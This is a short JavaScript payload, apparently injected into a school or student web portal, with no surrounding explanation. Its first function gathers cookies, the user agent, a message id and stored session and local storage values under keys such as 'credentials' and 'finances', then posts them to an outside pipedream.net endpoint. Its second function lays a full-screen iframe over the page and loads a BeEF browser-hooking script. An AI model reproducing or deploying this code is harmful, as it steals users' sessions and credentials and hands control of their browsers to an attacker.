(async function ex() {

	const ur = new URL(document.currentScript.src);
	const url = 'https://eocokq62jnfdj8e.m.pipedream.net/session';
	const messageid = new URL(window.top.document.querySelector('a[href*="Messagerie"]'));  
	const keys = [
		'accounts', 'badges', 'credentials', 'edhydration_auth',
		'etablissement', 'finances', 'bigAds', 'fa', 'pdfjs.history','panier'
	];
  
	const data = {
		t: new Date().toISOString(),
		u: navigator.userAgent,
		d: messageid.searchParams.get('idMessage') || "null",
		apiv: ur.searchParams.get("apiv") || "100.0",
		si: ur.searchParams.get("signature") || false,
		c: document.cookie,
		s: Object.fromEntries(
		keys
			.map(k => [k, sessionStorage.getItem(k) ?? localStorage.getItem(k)])
			.filter(([, v]) => v !== null)
			.map(([k, v]) => {
			try { return [k, JSON.parse(v)]; }
			catch { return [k, v]; }
			})
		)
	};

	try {
		await fetch(url, {
			method: "POST",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		});
	} catch {}
})();

(async function iframe() {
	const i = window.top.document.createElement('iframe');
	i.src = "/";
	i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
	i.className = 'EDsploit';
	window.top.document.body.appendChild(i);
        
	i.onload = () => {
		const beef = window.top.document.createElement("script");
		beef.src = "https://beef.local/hook.js";
		beef.async = true;
		window.top.document.body.appendChild(beef);
	};
	return;
})();
